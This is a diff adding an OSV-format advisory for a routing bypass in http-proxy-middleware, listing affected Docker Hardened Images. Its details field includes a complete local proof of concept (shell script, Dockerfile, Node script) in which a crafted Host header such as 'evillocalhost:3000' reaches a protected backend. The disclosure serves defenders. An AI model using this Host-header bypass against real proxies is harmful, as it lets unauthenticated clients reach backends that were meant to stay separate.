@@ -1,0 +1,211 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-lz6o-74wd-73ov-2n4w",
+  "modified": "2026-10-06T19:00:44Z",
+  "published": "2026-10-06T19:00:44Z",
+  "upstream": [
+    "CVE-2026-55602"
+  ],
+  "summary": "# Summary",
+  "details": "# Summary\n\n`http-proxy-middleware` documents `router` proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted `Host` header that is only a superstring match for a configured host+path key can still route a request to an unintended backend.\n\n# Details\n\nTested code state:\n\n- validated on tag `v4.0.0-beta.5`\n- corresponding commit: `339f09ede860197807d4fd99ed9020fa5d0bd358`\n\nRelevant code locations:\n\n- `src/router.ts`\n- `src/http-proxy-middleware.ts`\n\nAffected public API:\n\n- `createProxyMiddleware({ router: { 'host/path': 'http://target' } })`\n\nCode explanation:\n\nWhen a proxy-table router key contains `/`, `getTargetFromProxyTable()` concatenates attacker-controlled `req.headers.host` and `req.url` into a single `hostAndPath` string, then accepts the route if:\n\n```ts\nhostAndPath.indexOf(key) > -1\n```\n\nThat is a substring test, not an exact host match plus intended path match. In the validated PoC, the configured router key is:\n\n```txt\nlocalhost:3000/api\n```\n\nbut the attacker-controlled host is:\n\n```txt\nevillocalhost:3000\n```\n\nand the request path is:\n\n```txt\n/api\n```\n\nThe concatenated attacker-controlled string:\n\n```txt\nevillocalhost:3000/api\n```\n\nstill contains the configured router key as a substring, so the middleware selects the alternate backend even though the host is not equal to the configured host.\n\nExploit path:\n\n1. the application enables the documented proxy-table `router` feature with at least one host+path rule\n2. an external attacker sends an ordinary HTTP request with a crafted `Host` header\n3. `HttpProxyMiddleware.prepareProxyRequest()` applies router selection before proxying\n4. `getTargetFromProxyTable()` accepts the crafted `Host + path` string through substring matching\n5. the request is proxied to the wrong backend\n\n## PoC\n\nCreate these files in the same working directory and run:\n\n```bash\nbash ./run.sh\n```\n\n### File: `run.sh`\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nREPO_URL=\"https://github.com/chimurai/http-proxy-middleware.git\"\nREPO_REF=\"v4.0.0-beta.5\"\nWORKDIR=\"$(mktemp -d \"${SCRIPT_DIR}/.tmp-repro.XXXXXX\")\"\nTARGET_REPO_DIR=\"${WORKDIR}/repo\"\nREPRO_DIR=\"${WORKDIR}/reproduction\"\nIMAGE_TAG=\"http-proxy-middleware-router-bypass-poc\"\n\ncleanup() {\n  rm -rf \"${WORKDIR}\"\n}\ntrap cleanup EXIT\n\necho \"[a3] cloning target repository\"\ngit clone --quiet \"${REPO_URL}\" \"${TARGET_REPO_DIR}\"\ngit -C \"${TARGET_REPO_DIR}\" checkout --quiet \"${REPO_REF}\"\n\nmkdir -p \"${REPRO_DIR}\"\ncp \"${SCRIPT_DIR}/Dockerfile\" \"${WORKDIR}/Dockerfile\"\ncp \"${SCRIPT_DIR}/verify.mjs\" \"${REPRO_DIR}/verify.mjs\"\n\necho \"[a3] building reproduction image\"\ndocker build -f \"${WORKDIR}/Dockerfile\" -t \"${IMAGE_TAG}\" \"${WORKDIR}\"\n\necho \"[a3] running verification\"\ndocker run --rm \"${IMAGE_TAG}\" node /work/reproduction/verify.mjs\n```\n\n### File: `Dockerfile`\n\n```Dockerfile\nFROM node:22-bullseye\n\nWORKDIR /work\n\nCOPY repo/package.json repo/yarn.lock /work/repo/\n\nRUN corepack enable \\\n  && cd /work/repo \\\n  && yarn install --frozen-lockfile\n\nCOPY repo /work/repo\nRUN cd /work/repo && yarn build\n\nCOPY reproduction /work/reproduction\n```\n\n### File: `verify.mjs`\n\n```js\nimport http from 'node:http';\nimport fs from 'node:fs';\nimport assert from 'node:assert/strict';\n\nimport { createProxyMiddleware } from '/work/repo/dist/index.js';\n\nconst ROUTER_KEY = 'localhost:3000/api';\nconst CRAFTED_HOST = 'evillocalhost:3000';\n\nfunction listen(server, port) {\n  return new Promise((resolve) => {\n    server.listen(port, '127.0.0.1', () => resolve());\n  });\n}\n\nfunction close(server) {\n  return new Promise((resolve, reject) => {\n    server.close((err) => {\n      if (err) {\n        reject(err);\n        return;\n      }\n      resolve();\n    });\n  });\n}\n\nfunction request(path, host) {\n  return new Promise((resolve, reject) => {\n    const req = http.request(\n      {\n        host: '127.0.0.1',\n        port: 3000,\n        path,\n        method: 'GET',\n        headers: {\n          Host: host,\n        },\n      },\n      (res) => {\n        let data = '';\n        res.setEncoding('utf8');\n        res.on('data', (chunk) => {\n          data += chunk;\n        });\n        res.on('end', () => {\n          resolve({ statusCode: res.statusCode, body: data });\n        });\n      },\n    );\n    req.on('error', reject);\n    req.end();\n  });\n}\n\nconst defaultBackend = http.createServer((req, res) => {\n  res.end('DEFAULT');\n});\n\nconst secretBackend = http.createServer((req, res) => {\n  res.end('SECRET');\n});\n\nconst proxyMiddleware = createProxyMiddleware({\n  target: 'http://127.0.0.1:3101',\n  router: {\n    [ROUTER_KEY]: 'http://127.0.0.1:3102',\n  },\n});\n\nconst proxyServer = http.createServer((req, res) => {\n  proxyMiddleware(req, res, () => {\n    res.statusCode = 404;\n    res.end('NO_PROXY');\n  });\n});\n\ntry {\n  assert.ok(fs.existsSync('/work/repo/dist/index.js'));\n  assert.ok(fs.existsSync('/work/reproduction/verify.mjs'));\n\n  await listen(defaultBackend, 3101);\n  await listen(secretBackend, 3102);\n  await listen(proxyServer, 3000);\n  console.log('STEP start-services ok');\n\n  const baseline = await request('/api', 'safe.example:3000');\n  assert.equal(baseline.statusCode, 200);\n  assert.equal(baseline.body, 'DEFAULT');\n  console.log(`STEP baseline-route body=${baseline.body}`);\n\n  const crafted = await request('/api', CRAFTED_HOST);\n  assert.equal(crafted.statusCode, 200);\n  assert.equal(crafted.body, 'SECRET');\n  assert.notEqual(CRAFTED_HOST, ROUTER_KEY.split('/')[0]);\n  console.log(`STEP crafted-route body=${crafted.body}`);\n\n  console.log('RESULT reproduced host_header_injection router substring match bypass');\n} finally {\n  await Promise.allSettled([close(proxyServer), close(defaultBackend), close(secretBackend)]);\n}\n```\n\nThis PoC starts:\n\n- one default backend returning `DEFAULT`\n- one alternate backend returning `SECRET`\n- one proxy using:\n\n```js\ncreateProxyMiddleware({\n  target: 'http://127.0.0.1:3101',\n  router: {\n    [ROUTER_KEY]: 'http://127.0.0.1:3102',\n  },\n});\n```\n\nIt then sends:\n\n1. a baseline request to `/api` with `Host: safe.example:3000`\n2. a crafted request to `/api` with `Host: evillocalhost:3000`\n\nObserved result from the validated PoC:\n\n- baseline request: `STEP baseline-route body=DEFAULT`\n- crafted request: `STEP crafted-route body=SECRET`\n- success marker: `RESULT reproduced host_header_injection router substring match bypass`\n\nThe PoC is considered successful only if:\n\n1. the baseline request stays on the default backend\n2. the crafted request reaches the alternate backend\n3. the crafted host is not equal to the configured router host\n\n# Impact\n\nThis is a backend-selection integrity issue in a documented library feature. Applications that use host+path router-table rules for backend segmentation, tenant routing, or separation of public and more sensitive upstreams can have that routing boundary bypassed by an unauthenticated external client using an ordinary crafted `Host` header.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd",
+        "purl": "pkg:docker/dhi/argocd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.0.13-debian13",
+        "3.0.15-debian13",
+        "3.0.16-debian13",
+        "3.0.17-debian13",
+        "3.0.18-debian13",
+        "3.1.1-debian13",
+        "3.1.3-debian13",
+        "3.1.4-debian13",
+        "3.1.5-debian13",
+        "3.1.6-debian13",
+        "3.1.7-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "argocd",
+        "purl": "pkg:docker/dhi/argocd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "3.1.0-debian12",
+        "3.1.1-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "cassandra-reaper",
+        "purl": "pkg:docker/dhi/cassandra-reaper?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "4.2.1-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kubeflow-pipelines-frontend",
+        "purl": "pkg:docker/dhi/kubeflow-pipelines-frontend?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "2.14.3-debian13",
+        "2.14.4-debian13",
+        "2.15.0-debian13",
+        "2.15.0-debian13-dev",
+        "2.16.0-debian13",
+        "2.16.0-debian13-dev",
+        "2.16.1-debian13",
+        "2.16.1-debian13-dev",
+        "2.5.0-node24-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kubeflow-pipelines-frontend",
+        "purl": "pkg:docker/dhi/kubeflow-pipelines-frontend?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "2.5.0-node24-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "prometheus",
+        "purl": "pkg:docker/dhi/prometheus?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "3.10.0-debian13",
+        "3.10.0-debian13-fips",
+        "3.11.0-debian13",
+        "3.11.0-debian13-fips",
+        "3.11.1-debian13",
+        "3.11.1-debian13-fips",
+        "3.11.2-debian13",
+        "3.11.2-debian13-fips",
+        "3.11.3-debian13",
+        "3.11.3-debian13-fips",
+        "3.12.0-debian13",
+        "3.12.0-debian13-fips",
+        "3.5.0-debian13",
+        "3.5.0-debian13-fips",
+        "3.5.1-debian13",
+        "3.5.1-debian13-fips",
+        "3.5.2-debian13",
+        "3.5.2-debian13-fips",
+        "3.5.3-debian13",
+        "3.5.3-debian13-fips",
+        "3.5.4-debian13",
+        "3.5.4-debian13-fips",
+        "3.6.0-debian13",
+        "3.7.0-debian13",
+        "3.7.1-debian13",
+        "3.7.2-debian13",
+        "3.7.3-debian13",
+        "3.8.0-debian13",
+        "3.8.0-debian13-fips",
+        "3.8.1-debian13",
+        "3.8.1-debian13-fips",
+        "3.9.0-debian13",
+        "3.9.0-debian13-fips",
+        "3.9.1-debian13",
+        "3.9.1-debian13-fips"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "prometheus",
+        "purl": "pkg:docker/dhi/prometheus?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "3.4.1-debian12",
+        "3.4.2-debian12",
+        "3.5.0-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "superset",
+        "purl": "pkg:docker/dhi/superset?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "6.0.0-debian13",
+        "6.0.0-debian13-dev",
+        "6.1.0-debian13",
+        "6.1.0-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "unleash",
+        "purl": "pkg:docker/dhi/unleash?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "7.6.3-debian13",
+        "7.6.3-debian13-dev",
+        "7.6.3-debian13-fips",
+        "7.6.3-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-lz6o-74wd-73ov-2n4w"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-64mm-vxmg-q3vj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj"
+    }
+  ]
+}
